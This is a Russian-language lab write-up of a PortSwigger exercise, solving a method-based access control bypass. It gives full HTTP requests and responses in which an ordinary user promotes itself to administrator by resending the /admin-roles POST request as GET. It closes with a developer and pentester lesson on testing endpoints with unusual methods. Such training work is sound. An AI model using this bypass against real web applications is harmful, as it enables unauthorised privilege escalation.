обход через типы запросов 
#### HTTP POST 

лаба https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

есть моя учетка - нужно попасть в админку 
administrator:admin

------

просмотрел всю карту сайта полностью, пока не нашел ничего подозрительного в коде или в запросах, пробовал некоторые запросы менять их тип
ничего необычного нет

перепробовал 
 HTTP методы для  GET /admin HTTP/2

GET  
POST  
PUT  
PATCH  
DELETE
HEAD  
OPTIONS  
CONNECT  
TRACE
COPY  
MOVE  
LINK  
UNLINK  
LOCK  
UNLOCK  
PURGE  
PROPFIND  
PROPPATCH  
MKCOL  
SEARCH

никакой реакции..

---

короче - хз как это решить, прямых зацепок не вижу

но в описании лабы написана- что нужно войди в админку 
и даны логин и пароль (казалось бы - парадокс ?)

---

я залогинился в админа - и вижу тут функционал который позволяет менять обычным юзерам роли, повышать до админа и обратно

вот запрос на повышение роли юзера

```http
POST /admin-roles HTTP/2
Host: 0af700ba041f363180ee3f6400b900b6.web-security-academy.net
Cookie: session=i8hIcCg3NDYKLkbKgHOGssa8OGCh3Rdi
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0af700ba041f363180ee3f6400b900b6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af700ba041f363180ee3f6400b900b6.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=administrator&action=upgrade
```

---

,будучи в админском акке - я повысиль роль wiener до админа
теперь я зашел в свой акк wiener 

и у меня теперь такой же функционал есть как у админа, но здесь нет функционала для удаления юзеров

-----


попробую поменть action=upgrade
на action=delete

и роль сменилась на delete - и теперь нет доступа к админке у меня.. 

значит нужно менять url наверно вот так:

с этого POST /admin-roles HTTP/2
 на этот POST /admin-delete HTTP/2
 ++ вот так username=wiener&action=delete

думаю, это логично будет проверить

но проверка не удалась = POST /admin-delete HTTP/2  ответ 404

----


тогда можно попробовать подставить в запрос

```http
POST /admin-roles HTTP/2
Host: 0af700ba041f363180ee3f6400b900b6.web-security-academy.net
Cookie: session=qB2d3ra02IrdcNdJq0cMkz2yx6YxNb4V
Content-Length: 30
```

вот эти параметры
`username=carlos&action=upgrade`


создал и отправил запрос 
```http
POST /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0a2a00610379a1b8823d11e000eb00bf.web-security-academy.net
Cookie: session=fcbfVSDFWZZn2lPAKIoozXBKw2Q636eR
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a2a00610379a1b8823d11e000eb00bf.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

ответ 
```http
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

пробовал без куки - ответ тот же

-------

пробую сменить  POST на GET

и- видимо успех!  на запрос:
```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0a2a00610379a1b8823d11e000eb00bf.web-security-academy.net
Cookie: session=fcbfVSDFWZZn2lPAKIoozXBKw2Q636eR
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q
```
получаю ответ:
```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

------

видимо - запрос выполнился- теперь нужно сделать админом и мой профиль wiener



---
поменял юзера
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a2a00610379a1b8823d11e000eb00bf.web-security-academy.net
Cookie: session=Lg6fE17hjA4VSgeoisSjzRFDgTfyQWE1
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2a00610379a1b8823d11e000eb00bf.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

лаба решена, я стал админом, вернее, обычный юзер сам себя повысил до админа,
единственные неизвестные здесь это:
1)  путь /admin-roles
2) параметры  username=wiener&action=upgrade

этот путь и эти параметры недоступны обычным юзерам

------
но суть лабы видимо в том, чтобы показать то - как нельзя делать при проектировании веб систем!

----

#### вывод

`POST`-запрос блокировался
`GET`-запрос не блокировался

при разработке (и тем более при пентесте) нужно проверять, что происходит с защищённым эндпоинтом при использовании нестандартных методов — `GET`, `POST`, `PUT`, `PATCH`, `OPTIONS`, `HEAD` и даже левых вроде `POSTX`




